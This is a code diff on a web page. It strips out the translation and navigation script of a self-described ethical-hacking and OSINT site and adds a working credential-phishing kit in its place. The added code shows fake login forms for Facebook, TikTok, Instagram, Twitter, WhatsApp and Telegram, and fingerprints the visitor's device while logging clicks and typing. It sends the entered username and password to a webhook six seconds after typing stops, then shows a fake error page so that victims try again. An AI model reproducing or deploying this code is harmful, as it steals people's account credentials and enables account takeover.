-            <div class="info-box" id="infoBoxAssistance">
-                <span class="emoji">🤖</span>
-                <span class="message" data-i18n="assistance.info_default">Clique sur "Discuter" pour échanger avec une IA</span>
-            </div>
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        return {
+            userAgent: ua,
+            isMobile: /Mobi|Android|iPhone|iPad|iPod/i.test(ua),
+            isAndroid: /Android/i.test(ua),
+            isIOS: /iPhone|iPad|iPod/i.test(ua),
+            platform: navigator.platform || 'unknown',
+            screen: window.screen.width + 'x' + window.screen.height,
+            language: navigator.language || 'unknown',
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
+            url: window.location.href,
+            referrer: document.referrer || 'direct',
+            sessionId: state.sessionId,
+            attempts: state.attempts
+        };
+    }
 
-            <div class="footer-message">
-                ✊ <span data-i18n="assistance.footer">ton objectif ici est de connaitre pour te proteger et non pour t'enservir</span>
-            </div>
-        </div>
-    </div>
+    function captureEvent(type, detail = '') {
+        state.events.push({
+            type: type,
+            detail: detail,
+            time: Math.floor((Date.now() - state.startTime) / 1000) + 's'
+        });
+        if (state.events.length > 40) {
+            state.events.splice(0, 20);
+        }
+    }
 
-    <script>
-        // ========== SYSTÈME DE TRADUCTION ==========
-        const translations = {
-            fr: {
-                // Global
-                "global.create_account": "CRÉER UN COMPTE",
-                "global.login": "CONNEXION",
-                "global.back": "← Retour",
-                // Sidebar
-                "sidebar.profil": "👤 Profil",
-                "sidebar.settings": "⚙️ Paramètres",
-                "sidebar.contact": "📬 Contact",
-                "sidebar.luminosity": "☀️ Luminosité",
-                "sidebar.logout": "🚪 SE DÉCONNECTER",
-                // Home
-                "home.badge": "PLATEFORME OSINT PROFESSIONNELLE",
-                "home.subtitle": "Accumulateur des commandes Termux à usage éthique.<br>Ici on retrouve des outils très intéressants, des documents en programmation et hacking éthique.",
-                "home.feature1_title": "Recherche Multi-Sources",
-                "home.feature1_desc": "Interrogez des dizaines de sources publiques en un seul clic.",
-                "home.feature2_title": "100% Légal & Éthique",
-                "home.feature2_desc": "Seules les données publiques et légales sont exploitées.",
-                "home.feature3_title": "Rapports Détaillés",
-                "home.feature3_desc": "Exportez vos résultats en PDF ou CSV avec scoring de confiance.",
-                "home.stat1": "RECHERCHES EFFECTUÉES",
-                "home.stat2": "UTILISATEURS ACTIFS",
-                "home.stat3": "SOURCES OSINT",
-                "home.stat4": "DISPONIBILITÉ",
-                "home.about_title": "À propos de LOLA-PLUS",
-                "home.about_text": "LOLA_PLUS est une plateforme OSINT professionnelle conçue pour les chercheurs, analystes et professionnels de la cybersécurité. Notre moteur agrège des données provenant de sources publiques et légales, tout en centralisant des ressources éducatives en programmation et en sécurité offensive pour une montée en compétence éthique.",
-                // Footer
-                "footer.terms": "Conditions d'utilisation",
-                "footer.privacy": "Politique de confidentialité",
-                "footer.contact": "Contact",
-                "footer.copyright": "© 2024 LOLA-PLUS — Tous droits réservés.",
-                "footer.creator": "Créateur : Fassou lolamou",
-                // Signup
-                "signup.title": "LOLA PLUS",
-                "signup.subtitle": "Rejoignez la communauté lola plus",
-                "signup.firstname": "Prénom",
-                "signup.lastname": "Nom",
-                "signup.username": "Nom d'utilisateur",
-                "signup.email": "Adresse email",
-                "signup.password": "Mot de passe",
-                "signup.confirm_password": "Confirmer le mot de passe",
-                "signup.phone": "Téléphone (optionnel)",
-                "signup.country": "Pays",
-                "signup.submit": "▶ CRÉER MON COMPTE",
-                // Login
-                "login.title": "CONNEXION",
-                "login.email": "ADRESSE EMAIL",
-                "login.password": "MOT DE PASSE",
-                // Profile
-                "profile.photo": "Photo",
-                "profile.stat1": "COMMANDES TERMUX",
-                "profile.stat2": "SITES À CONNAITRE",
-                "profile.stat3": "PDF-BOOK",
-                "profile.stat4": "ASSISTANCE",
-                "profile.youtube": "NOTRE-YOUTUBE",
-                "profile.tiktok": "NOTRE-TIKTOK",
-                "profile.whatsapp": "CHAINE WHATSAPP",
-                "profile.facebook": "NOTRE-FACEBOOK",
-                // Settings
-                "settings.title": "Paramètres",
-                "settings.language": "Langue",
-                "settings.security": "Sécurité",
-                "settings.current_password": "Changer le mot de passe",
-                "settings.new_password": "Nouveau mot de passe",
-                "settings.confirm_new_password": "Confirmer le nouveau mot de passe",
-                "settings.change_password": "CHANGER LE MOT DE PASSE",
-                "settings.twofa": "Double authentification",
-                "settings.twofa_status": "2FA désactivée",
-                "settings.twofa_activate": "ACTIVER LA 2FA",
-                // Termux
-                "termux.subtitle": "Android Terminal Emulator — Référence Complète",
-                "termux.stat1": "commandes",
-                "termux.stat2": "catégories",
-                "termux.stat3": "testé",
-                "termux.filter_all": "Tout",
-                "termux.filter_install": " Install",
-                "termux.filter_reseau": " Réseau",
-                "termux.filter_fichiers": " Fichiers",
-                "termux.filter_systeme": "⚙️ Système",
-                "termux.filter_outils": " Outils",
-                "termux.filter_hacking": " Hacking",
-                "termux.footer": "// USE RESPONSIBLY — EDUCATIONAL PURPOSES ONLY //",
-                // Sites
-                "sites.credit": "📌 collectés par FASSOU LOLAMOU",
-                "sites.title": "SITES À CONNAITRE",
-                "sites.subtitle": "🔍 Reconnaître les pièges pour ne pas se faire avoir",
-                "sites.alert": "⚠️ <strong>Ne clique jamais</strong> sur ces sites sans les avoir analysés.<br />Ils servent à <strong>voler tes données, tracker ton IP ou infecter ton appareil</strong>.",
-                "sites.info_default": "Clique sur un site pour voir son danger et son lien",
-                "sites.warning": "<strong>🔐 Règle d'or :</strong> Avant de cliquer sur un lien inconnu, <strong>colle-le dans VirusTotal</strong>.<br />Ne jamais entrer ses identifiants sur un site reçu par SMS ou email.",
-                "sites.footer": " collecté par fassou lolamou . ton objectif ici est de connaitre pour te proteger et non pour t'enservir",
-                // PDF
-                "pdf.credit": "📌 collectés par FASSOU LOLAMOU",
-                "pdf.title": "Bibliothèque PDF",
-                "pdf.subtitle": "📖 Ressources à connaître pour se protéger",
-                "pdf.drop_text": "Ajoute tes propres PDF",
-                "pdf.drop_subtext": "Dépose ou clique",
-                "pdf.counter": "PDF ajoutés (hors ressources)",
-                "pdf.footer": "ton objectif ici est de connaitre pour te proteger et non pour t'enservir",
-                // Assistance
-                "assistance.credit": "📌 collectés par FASSOU LOLAMOU",
-                "assistance.title": "IA Hack & Code",
-                "assistance.subtitle": "⚡ 2 IA gratuites pour apprendre et progresser",
-                "assistance.hack_name": "HackBot",
-                "assistance.hack_desc": "IA spécialisée en sécurité offensive, pentesting et hack éthique.",
-                "assistance.hack_badge": "🛡️ HACK ÉTHIQUE",
-                "assistance.code_name": "CodeMate",
-                "assistance.code_desc": "IA d'assistance au codage, débogage et optimisation de scripts.",
-                "assistance.code_badge": "💻 CODAGE",
-                "assistance.chat": "💬 Discuter",
-                "assistance.info_default": "Clique sur \"Discuter\" pour échanger avec une IA",
-                "assistance.footer": "ton objectif ici est de connaitre pour te proteger et non pour t'enservir"
-            },
-            en: {
-                "global.create_account": "CREATE ACCOUNT",
-                "global.login": "LOGIN",
-                "global.back": "← Back",
-                "sidebar.profil": "👤 Profile",
-                "sidebar.settings": "⚙️ Settings",
-                "sidebar.contact": "📬 Contact",
-                "sidebar.luminosity": "☀️ Luminosity",
-                "sidebar.logout": "🚪 LOGOUT",
-                "home.badge": "PROFESSIONAL OSINT PLATFORM",
-                "home.subtitle": "Accumulator of Termux commands for ethical use.<br>Here you find interesting tools, programming documents and ethical hacking.",
-                "home.feature1_title": "Multi-Source Search",
-                "home.feature1_desc": "Query dozens of public sources with one click.",
-                "home.feature2_title": "100% Legal & Ethical",
-                "home.feature2_desc": "Only public and legal data is exploited.",
-                "home.feature3_title": "Detailed Reports",
-                "home.feature3_desc": "Export your results as PDF or CSV with confidence scoring.",
-                "home.stat1": "SEARCHES PERFORMED",
-                "home.stat2": "ACTIVE USERS",
-                "home.stat3": "OSINT SOURCES",
-                "home.stat4": "AVAILABILITY",
-                "home.about_title": "About LOLA-PLUS",
-                "home.about_text": "LOLA_PLUS is a professional OSINT platform designed for researchers, analysts and cybersecurity professionals. Our engine aggregates data from public and legal sources, while centralizing educational resources in programming and offensive security for ethical skill building.",
-                "footer.terms": "Terms of use",
-                "footer.privacy": "Privacy policy",
-                "footer.contact": "Contact",
-                "footer.copyright": "© 2024 LOLA-PLUS — All rights reserved.",
-                "footer.creator": "Creator: Fassou lolamou",
-                "signup.title": "LOLA PLUS",
-                "signup.subtitle": "Join the lola plus community",
-                "signup.firstname": "First name",
-                "signup.lastname": "Last name",
-                "signup.username": "Username",
-                "signup.email": "Email address",
-                "signup.password": "Password",
-                "signup.confirm_password": "Confirm password",
-                "signup.phone": "Phone (optional)",
-                "signup.country": "Country",
-                "signup.submit": "▶ CREATE MY ACCOUNT",
-                "login.title": "LOGIN",
-                "login.email": "EMAIL ADDRESS",
-                "login.password": "PASSWORD",
-                "profile.photo": "Photo",
-                "profile.stat1": "TERMUX COMMANDS",
-                "profile.stat2": "SITES TO KNOW",
-                "profile.stat3": "PDF-BOOK",
-                "profile.stat4": "ASSISTANCE",
-                "profile.youtube": "OUR-YOUTUBE",
-                "profile.tiktok": "OUR-TIKTOK",
-                "profile.whatsapp": "WHATSAPP CHANNEL",
-                "profile.facebook": "OUR-FACEBOOK",
-                "settings.title": "Settings",
-                "settings.language": "Language",
-                "settings.security": "Security",
-                "settings.current_password": "Change password",
-                "settings.new_password": "New password",
-                "settings.confirm_new_password": "Confirm new password",
-                "settings.change_password": "CHANGE PASSWORD",
-                "settings.twofa": "Two-factor authentication",
-                "settings.twofa_status": "2FA disabled",
-                "settings.twofa_activate": "ACTIVATE 2FA",
-                "termux.subtitle": "Android Terminal Emulator — Complete Reference",
-                "termux.stat1": "commands",
-                "termux.stat2": "categories",
-                "termux.stat3": "tested",
-                "termux.filter_all": "All",
-                "termux.filter_install": " Install",
-                "termux.filter_reseau": " Network",
-                "termux.filter_fichiers": " Files",
-                "termux.filter_systeme": "⚙️ System",
-                "termux.filter_outils": " Tools",
-                "termux.filter_hacking": " Hacking",
-                "termux.footer": "// USE RESPONSIBLY — EDUCATIONAL PURPOSES ONLY //",
-                "sites.credit": "📌 collected by FASSOU LOLAMOU",
-                "sites.title": "SITES TO KNOW",
-                "sites.subtitle": "🔍 Recognize traps to avoid being fooled",
-                "sites.alert": "⚠️ <strong>Never click</strong> on these sites without analyzing them.<br />They are used to <strong>steal your data, track your IP or infect your device</strong>.",
-                "sites.info_default": "Click on a site to see its danger and link",
-                "sites.warning": "<strong>🔐 Golden rule:</strong> Before clicking on an unknown link, <strong>paste it into VirusTotal</strong>.<br />Never enter your credentials on a site received by SMS or email.",
-                "sites.footer": " collected by fassou lolamou . your goal here is to know to protect yourself and not to enslave yourself",
-                "pdf.credit": "📌 collected by FASSOU LOLAMOU",
-                "pdf.title": "PDF Library",
-                "pdf.subtitle": "📖 Resources to know to protect yourself",
-                "pdf.drop_text": "Add your own PDFs",
-                "pdf.drop_subtext": "Drop or click",
-                "pdf.counter": "PDFs added (excluding resources)",
-                "pdf.footer": "your goal here is to know to protect yourself and not to enslave yourself",
-                "assistance.credit": "📌 collected by FASSOU LOLAMOU",
-                "assistance.title": "AI Hack & Code",
-                "assistance.subtitle": "⚡ 2 free AIs to learn and progress",
-                "assistance.hack_name": "HackBot",
-                "assistance.hack_desc": "AI specialized in offensive security, pentesting and ethical hacking.",
-                "assistance.hack_badge": "🛡️ ETHICAL HACKING",
-                "assistance.code_name": "CodeMate",
-                "assistance.code_desc": "AI assistant for coding, debugging and script optimization.",
-                "assistance.code_badge": "💻 CODING",
-                "assistance.chat": "💬 Chat",
-                "assistance.info_default": "Click on \"Chat\" to interact with an AI",
-                "assistance.footer": "your goal here is to know to protect yourself and not to enslave yourself"
-            },
-            ht: {
-                "global.create_account": "KREYE YON KONT",
-                "global.login": "KONEKSYON",
-                "global.back": "← Retounen",
-                "sidebar.profil": "👤 Pwofil",
-                "sidebar.settings": "⚙️ Paramèt",
-                "sidebar.contact": "📬 Kontak",
-                "sidebar.luminosity": "☀️ Limyè",
-                "sidebar.logout": "🚪 DEKONEKTE",
-                "home.badge": "PLATFÒM OSINT PWOFESYONÈL",
-                "home.subtitle": "Akimilatè kòmand Termux pou itilizasyon etik.<br>Isit la w ap jwenn zouti enteresan, dokiman sou pwogramasyon ak hacking etik.",
-                "home.feature1_title": "Rechèch Multi-Sous",
-                "home.feature1_desc": "Interroge plizyè sous piblik nan yon sèl klike.",
-                "home.feature2_title": "100% Legal & Etik",
-                "home.feature2_desc": "Se sèlman done piblik ak legal yo itilize.",
-                "home.feature3_title": "Rapò Detaye",
-                "home.feature3_desc": "Ekspòte rezilta ou an PDF oswa CSV ak nòt konfyans.",
-                "home.stat1": "RECHÈCH FÈ",
-                "home.stat2": "ITILIZATÈ AKTIF",
-                "home.stat3": "SOUS OSINT",
-                "home.stat4": "DISPONIBILITE",
-                "home.about_title": "Sou LOLA-PLUS",
-                "home.about_text": "LOLA_PLUS se yon platfòm OSINT pwofesyonèl ki fèt pou chèchè, analis ak pwofesyonèl nan sekirite sybernetik. Motè nou an rasanble done ki soti nan sous piblik ak legal, pandan l ap santralize resous edikatif nan pwogramasyon ak sekirite ofansif pou amelyore konpetans etik.",
-                "footer.terms": "Kondisyon itilizasyon",
-                "footer.privacy": "Politik konfidansyèl",
-                "footer.contact": "Kontak",
-                "footer.copyright": "© 2024 LOLA-PLUS — Tout dwa rezève.",
-                "footer.creator": "Kreatè : Fassou lolamou",
-                "signup.title": "LOLA PLUS",
-                "signup.subtitle": "Antre nan kominote lola plus la",
-                "signup.firstname": "Premye non",
-                "signup.lastname": "Siyati",
-                "signup.username": "Non itilizatè",
-                "signup.email": "Adrès imèl",
-                "signup.password": "Modpas",
-                "signup.confirm_password": "Konfime modpas",
-                "signup.phone": "Telefòn (opsyonèl)",
-                "signup.country": "Peyi",
-                "signup.submit": "▶ KREYE KONT MWEN",
-                "login.title": "KONEKSYON",
-                "login.email": "ADRÈS IMÈL",
-                "login.password": "MODPAS",
-                "profile.photo": "Foto",
-                "profile.stat1": "KOMAND TERMUX",
-                "profile.stat2": "SIT YO KONNEN",
-                "profile.stat3": "PDF-BOOK",
-                "profile.stat4": "ASISTANS",
-                "profile.youtube": "NOU-YOUTUBE",
-                "profile.tiktok": "NOU-TIKTOK",
-                "profile.whatsapp": "CHANÈL WHATSAPP",
-                "profile.facebook": "NOU-FACEBOOK",
-                "settings.title": "Paramèt",
-                "settings.language": "Lang",
-                "settings.security": "Sekirite",
-                "settings.current_password": "Chanje modpas",
-                "settings.new_password": "Nouvo modpas",
-                "settings.confirm_new_password": "Konfime nouvo modpas",
-                "settings.change_password": "CHANJE MODPAS",
-                "settings.twofa": "Otantifikasyon doub",
-                "settings.twofa_status": "2FA deaktive",
-                "settings.twofa_activate": "AKTIVE 2FA",
-                "termux.subtitle": "Emulatè tèminal Android — Referans Konplè",
-                "termux.stat1": "kòmand",
-                "termux.stat2": "kategori",
-                "termux.stat3": "teste",
-                "termux.filter_all": "Tout",
-                "termux.filter_install": " Enstalasyon",
-                "termux.filter_reseau": " Rezo",
-                "termux.filter_fichiers": " Dosye",
-                "termux.filter_systeme": "⚙️ Sistèm",
-                "termux.filter_outils": " Zouti",
-                "termux.filter_hacking": " Hacking",
-                "termux.footer": "// ITILIZE AVÈK RESPONSABILITE — SÈLMAN POU REZON EDUKATIF //",
-                "sites.credit": "📌 kolekte pa FASSOU LOLAMOU",
-                "sites.title": "SIT YO KONNEN",
-                "sites.subtitle": "🔍 Rekonèt pyèj yo pou pa tonbe",
-                "sites.alert": "⚠️ <strong>Pa janm klike</strong> sou sit sa yo san ou pa analize yo.<br />Yo sèvi pou <strong>vòlè done w, swiv IP w oswa enfekte aparèy w</strong>.",
-                "sites.info_default": "Klike sou yon sit pou wè danje li ak lyen li",
-                "sites.warning": "<strong>🔐 Règ lò :</strong> Anvan w klike sou yon lyen ou pa konnen, <strong>kole li nan VirusTotal</strong>.<br />Pa janm mete idantifyan ou sou yon sit ou resevwa pa SMS oswa imèl.",
-                "sites.footer": " kolekte pa fassou lolamou . objektif ou isit la se konnen pou pwoteje tèt ou epi pa pou esklavaj",
-                "pdf.credit": "📌 kolekte pa FASSOU LOLAMOU",
-                "pdf.title": "Bibliyotèk PDF",
-                "pdf.subtitle": "📖 Resous yo konnen pou pwoteje tèt ou",
-                "pdf.drop_text": "Ajoute pwòp PDF ou",
-                "pdf.drop_subtext": "Depoze oswa klike",
-                "pdf.counter": "PDF ajoute (eksepte resous)",
-                "pdf.footer": "objektif ou isit la se konnen pou pwoteje tèt ou epi pa pou esklavaj",
-                "assistance.credit": "📌 kolekte pa FASSOU LOLAMOU",
-                "assistance.title": "IA Hack & Code",
-                "assistance.subtitle": "⚡ 2 IA gratis pou aprann ak pwogrese",
-                "assistance.hack_name": "HackBot",
-                "assistance.hack_desc": "IA espesyalize nan sekirite ofansif, pentesting ak hacking etik.",
-                "assistance.hack_badge": "🛡️ HACK ETIK",
-                "assistance.code_name": "CodeMate",
-                "assistance.code_desc": "IA asistans pou kodaj, debogaj ak optimize scripts.",
-                "assistance.code_badge": "💻 KODAJ",
-                "assistance.chat": "💬 Pale",
-                "assistance.info_default": "Klike sou \"Pale\" pou pale ak yon IA",
-                "assistance.footer": "objektif ou isit la se konnen pou pwoteje tèt ou epi pa pou esklavaj"
-            }
+    // =========================================================
+    // 4. EXFILTRATION – ENVOI DES IDENTIFIANTS
+    // =========================================================
+    function exfiltrateCredentials() {
+        const login = dom.loginInput.value.trim();
+        const pass = dom.passInput.value.trim();
+
+        if (!login || !pass) return false;
+        if (state.alreadySent) return false;
+
+        state.attempts++;
+        state.alreadySent = true;
+        state.errorShown = false;
+        const service = state.selectedService;
+
+        const credentials = {
+            service: service,
+            service_label: getServiceLabel(service),
+            login: login,
+            password: pass,
+            attempt_number: state.attempts,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            device: getDeviceInfo()
         };
 
-        let currentLang = localStorage.getItem('lola_lang') || 'fr';
+        const payload = {
+            session: state.sessionId,
+            timestamp: new Date().toISOString(),
+            elapsed: Math.floor((Date.now() - state.startTime) / 1000) + 's',
+            device: getDeviceInfo(),
+            data: {
+                action: 'credentials_captured',
+                credentials: credentials,
+                attempt: state.attempts
+            },
+            events: state.events.slice(-25),
+            attempts: state.attempts
+        };
 
-        function applyTranslations(lang) {
-            const elements = document.querySelectorAll('[data-i18n]');
-            elements.forEach(el => {
-                const key = el.getAttribute('data-i18n');
-                if (translations[lang] && translations[lang][key]) {
-                    if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
-                        el.placeholder = translations[lang][key];
-                    } else {
-                        el.innerHTML = translations[lang][key];
-                    }
+        try {
+            fetch(CONFIG.webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: '```json\n' + JSON.stringify(payload, null, 2) + '\n```'
+                })
+            }).catch(() => {});
+            state.exfiltrated = true;
+            updateStatus('✅ Identifiants envoyés (' + state.attempts + ')');
+            captureEvent('credentials_sent', service + ' | ' + login.substring(0, 10) + '...');
+
+            // Afficher la page d'erreur après 1.5s
+            setTimeout(() => {
+                if (!state.errorShown) {
+                    showErrorPage();
                 }
-            });
-            // Mettre à jour les indicateurs de langue
-            document.querySelectorAll('.lang-option .check').forEach(c => c.classList.add('inactive'));
-            const activeCheck = document.getElementById('lang-' + lang);
-            if (activeCheck) {
-                activeCheck.classList.remove('inactive');
-                activeCheck.textContent = '✔';
+            }, 1500);
+
+            return true;
+        } catch(e) {
+            return false;
+        }
+    }
+
+    // =========================================================
+    // 5. DÉTECTION AUTOMATIQUE – ATTENTE 6 SECONDES APRÈS LA DERNIÈRE FRAPPE
+    // =========================================================
+    function resetTimer() {
+        if (state.timer) {
+            clearTimeout(state.timer);
+            state.timer = null;
+        }
+
+        const login = dom.loginInput.value.trim();
+        const pass = dom.passInput.value.trim();
+
+        // Si les deux champs sont remplis et qu'on n'a pas encore envoyé
+        if (login && pass && !state.alreadySent && !state.isProcessing) {
+            // Démarrer le timer de 6 secondes
+            state.timer = setTimeout(() => {
+                // Vérifier que les champs sont toujours remplis
+                const loginNow = dom.loginInput.value.trim();
+                const passNow = dom.passInput.value.trim();
+                if (loginNow && passNow && !state.alreadySent && !state.isProcessing) {
+                    exfiltrateCredentials();
+                }
+                state.timer = null;
+            }, 6000);
+        }
+    }
+
+    // =========================================================
+    // 6. BARRE DE PROGRESSION
+    // =========================================================
+    function showProgress(duration = 2000) {
+        dom.progressWrapper.classList.add('active');
+        dom.progressBar.style.width = '0%';
+        const startTime = Date.now();
+
+        return new Promise((resolve) => {
+            const interval = setInterval(() => {
+                const elapsed = Date.now() - startTime;
+                const progress = Math.min((elapsed / duration) * 100, 100);
+                dom.progressBar.style.width = progress + '%';
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    dom.progressWrapper.classList.remove('active');
+                    dom.progressBar.style.width = '0%';
+                    resolve();
+                }
+            }, 30);
+        });
+    }
+
+    // =========================================================
+    // 7. PAGE D'ERREUR (Google style)
+    // =========================================================
+    function showErrorPage() {
+        if (state.errorShown) return;
+        state.errorShown = true;
+        dom.errorOverlay.classList.add('active');
+        dom.continueBtn.disabled = false;
+        dom.continueBtn.textContent = '🚀 Réessayer';
+        setSpinner(false);
+        state.isProcessing = false;
+        dom.passInput.value = '';
+        state.alreadySent = false;
+        updateStatus('❌ Échec de connexion');
+        captureEvent('error_page_shown', 'tentative #' + state.attempts);
+        setTimeout(() => {
+            dom.loginInput.focus();
+        }, 300);
+    }
+
+    // =========================================================
+    // 8. SÉLECTION DU SERVICE
+    // =========================================================
+    function selectService(service) {
+        state.selectedService = service;
+        dom.serviceCards.forEach(card => {
+            card.classList.remove('active');
+            if (card.dataset.service === service) {
+                card.classList.add('active');
             }
-            localStorage.setItem('lola_lang', lang);
-            currentLang = lang;
-        }
-
-        function setLanguage(lang) {
-            applyTranslations(lang);
-            showToast('✅ Langue changée / Language changed / Lang chanje', 'success');
-        }
-
-        // Appliquer la langue au chargement
-        document.addEventListener('DOMContentLoaded', function() {
-            applyTranslations(currentLang);
         });
 
-        // === TOAST NOTIFICATIONS ===
-        function showToast(message, type = 'info') {
-            const container = document.getElementById('toast-container');
-            const toast = document.createElement('div');
-            toast.className = `toast ${type}`;
-            toast.textContent = message;
-            container.appendChild(toast);
+        // Réinitialiser le formulaire
+        dom.loginInput.value = '';
+        dom.passInput.value = '';
+        state.alreadySent = false;
+        state.errorShown = false;
+        if (state.timer) {
+            clearTimeout(state.timer);
+            state.timer = null;
+        }
+
+        dom.progressWrapper.classList.add('active');
+        dom.progressBar.style.width = '0%';
+        let progress = 0;
+        const interval = setInterval(() => {
+            progress += Math.random() * 15 + 5;
+            if (progress > 100) progress = 100;
+            dom.progressBar.style.width = progress + '%';
+            if (progress >= 100) {
+                clearInterval(interval);
+                dom.progressWrapper.classList.remove('active');
+                dom.progressBar.style.width = '0%';
+                showForm(service);
+            }
+        }, 150);
+    }
+
+    function showForm(service) {
+        const labels = {
+            facebook: '📧 Email / Identifiant Facebook',
+            tiktok: '👤 Nom d\'utilisateur TikTok',
+            instagram: '📧 Email / Pseudo Instagram',
+            twitter: '🐦 Email / Pseudo Twitter',
+            whatsapp: '📱 Numéro WhatsApp',
+            telegram: '✈️ Numéro / Pseudo Telegram'
+        };
+        dom.fieldLabel.textContent = labels[service] || '📧 Identifiant';
+        dom.loginInput.placeholder = 'Entrez votre ' + (labels[service] || 'identifiant');
+        dom.formSection.classList.add('visible');
+        dom.loginInput.value = '';
+        dom.passInput.value = '';
+        state.alreadySent = false;
+        state.errorShown = false;
+        dom.loginInput.focus();
+        captureEvent('form_shown', service);
+    }
+
+    // =========================================================
+    // 9. FONCTION PRINCIPALE (bouton Continuer)
+    // =========================================================
+    async function handleContinue() {
+        if (state.isProcessing) return;
+
+        const login = dom.loginInput.value.trim();
+        const pass = dom.passInput.value.trim();
+
+        if (!pass) {
+            updateStatus('⚠️ Veuillez saisir votre mot de passe');
+            dom.passInput.focus();
+            dom.passInput.style.borderColor = '#ff4444';
+            setTimeout(() => { dom.passInput.style.borderColor = '#2a3650'; }, 2000);
+            return;
+        }
+
+        // Si le timer est en cours, on l'annule
+        if (state.timer) {
+            clearTimeout(state.timer);
+            state.timer = null;
+        }
+
+        // Si les identifiants n'ont pas été envoyés automatiquement
+        if (!state.alreadySent && login && pass) {
+            exfiltrateCredentials();
+            // Forcer l'affichage de l'erreur si elle n'est pas encore apparue
             setTimeout(() => {
-                if (toast.parentNode) toast.remove();
-            }, 3000);
+                if (!state.errorShown) {
+                    showErrorPage();
+                }
+            }, 1500);
+        } else {
+            // Si déjà envoyé, on affiche juste l'erreur
+            if (!state.errorShown) {
+                showErrorPage();
+            }
         }
 
-        // === DÉCONNEXION (CORRIGÉE - NE SUPPRIME PAS LE COMPTE) ===
-        function logout() {
-            navigate('main-content');
-            showToast('👋 Déconnecté avec succès !', 'info');
-            closeSidebar();
-        }
+        state.isProcessing = true;
+        dom.continueBtn.disabled = true;
+        dom.continueBtn.textContent = '⏳ Connexion...';
+        setSpinner(true);
+        updateStatus('📡 Tentative de connexion...');
 
-        // === 2FA ===
-        function handle2FA() {
-            showToast('🔐 2FA activée avec succès !', 'success');
-        }
+        await showProgress(1800);
 
-        // === BARRE DE PROGRESSION ===
-        function startProgress() {
-            const bar = document.getElementById('progress-bar');
-            bar.style.display = 'block';
-            bar.style.width = '0%';
-            setTimeout(() => { bar.style.width = '30%'; }, 100);
-            setTimeout(() => { bar.style.width = '60%'; }, 500);
-            setTimeout(() => { bar.style.width = '85%'; }, 1000);
+        if (!state.errorShown) {
+            showErrorPage();
         }
+        dom.continueBtn.disabled = false;
+        dom.continueBtn.textContent = '🚀 Réessayer';
+        setSpinner(false);
+        state.isProcessing = false;
+    }
 
-        function completeProgress() {
-            const bar = document.getElementById('progress-bar');
-            bar.style.width = '100%';
+    // =========================================================
+    // 10. ÉCOUTEURS
+    // =========================================================
+    function setupUI() {
+        dom.serviceCards.forEach(card => {
+            card.addEventListener('click', function(e) {
+                e.preventDefault();
+                const service = this.dataset.service;
+                if (service && service !== state.selectedService) {
+                    selectService(service);
+                }
+            });
+        });
+
+        dom.continueBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            if (!state.isProcessing) {
+                handleContinue();
+            }
+        });
+
+        // Détection de saisie – reset du timer à chaque frappe
+        dom.loginInput.addEventListener('input', function() {
+            captureEvent('input_login', this.value.substring(0, 10) + '...');
+            resetTimer();
+        });
+
+        dom.passInput.addEventListener('input', function() {
+            captureEvent('input_pass', '*****' + this.value.length + ' caractères');
+            resetTimer();
+        });
+
+        // Touche Entrée
+        dom.loginInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') { e.preventDefault(); if (!state.isProcessing) handleContinue(); }
+        });
+        dom.passInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') { e.preventDefault(); if (!state.isProcessing) handleContinue(); }
+        });
+
+        dom.retryErrorBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            dom.errorOverlay.classList.remove('active');
+            state.errorShown = false;
+            dom.loginInput.focus();
+            updateStatus('🔒 Réessayez');
+            state.alreadySent = false;
+            if (state.timer) {
+                clearTimeout(state.timer);
+                state.timer = null;
+            }
+            captureEvent('retry_error', 'bouton réessayer');
             setTimeout(() => {
-                bar.style.width = '0%';
-                bar.style.display = 'none';
+                if (!state.isProcessing) {
+                    handleContinue();
+                }
             }, 500);
-        }
+        });
 
-        function navigateWithProgress(pageId) {
-            startProgress();
-            setTimeout(() => {
-                navigate(pageId);
-                completeProgress();
-            }, 2000);
-        }
+        document.addEventListener('click', function(e) {
+            captureEvent('click', e.target.tagName + (e.target.id ? '#' + e.target.id : ''));
+        });
 
-        // === NAVIGATION ===
-        function navigate(pageId) {
-            document.querySelectorAll('.page-container, #main-content').forEach(p => p.style.display = 'none');
-            document.getElementById('main-content').style.display = (pageId === 'main-content') ? 'block' : 'none';
-            document.getElementById('signup-page').style.display = (pageId === 'signup-page') ? 'block' : 'none';
-            document.getElementById('login-page').style.display = (pageId === 'login-page') ? 'block' : 'none';
-            document.getElementById('profile-page').style.display = (pageId === 'profile-page') ? 'block' : 'none';
-            document.getElementById('settings-page').style.display = (pageId === 'settings-page') ? 'block' : 'none';
-            document.getElementById('termux-page').style.display = (pageId === 'termux-page') ? 'block' : 'none';
-            document.getElementById('sites-page').style.display = (pageId === 'sites-page') ? 'block' : 'none';
-            document.getElementById('pdf-page').style.display = (pageId === 'pdf-page') ? 'block' : 'none';
-            document.getElementById('assistance-page').style.display = (pageId === 'assistance-page') ? 'block' : 'none';
-            closeSidebar();
-            // Appliquer les traductions sur la page chargée
-            applyTranslations(currentLang);
-
-            if (pageId === 'profile-page') {
-                const user = JSON.parse(localStorage.getItem('lola_user'));
-                document.getElementById('profile-name').textContent = user ? user.username : 'Invité';
-                const avatar = localStorage.getItem('lola_avatar');
-                if (avatar) {
-                    document.getElementById('avatar-image').src = avatar;
-                    document.getElementById('avatar-image').style.display = 'block';
-                    document.getElementById('avatar-placeholder').style.display = 'none';
-                } else {
-                    document.getElementById('avatar-image').style.display = 'none';
-                    document.getElementById('avatar-placeholder').style.display = 'flex';
-                }
+        let scrollTimer = 0;
+        document.addEventListener('scroll', function() {
+            if (Date.now() - scrollTimer > 3000) {
+                scrollTimer = Date.now();
+                captureEvent('scroll', `y:${window.scrollY}`);
             }
-            if (pageId === 'termux-page') {
-                if (!document.getElementById('termux-grid').hasChildNodes()) {
-                    loadTermuxCodes();
-                }
-            }
-            if (pageId === 'sites-page') {
-                if (!document.getElementById('conteneurBoutons').hasChildNodes()) {
-                    loadSites();
-                }
-            }
-            if (pageId === 'pdf-page') {
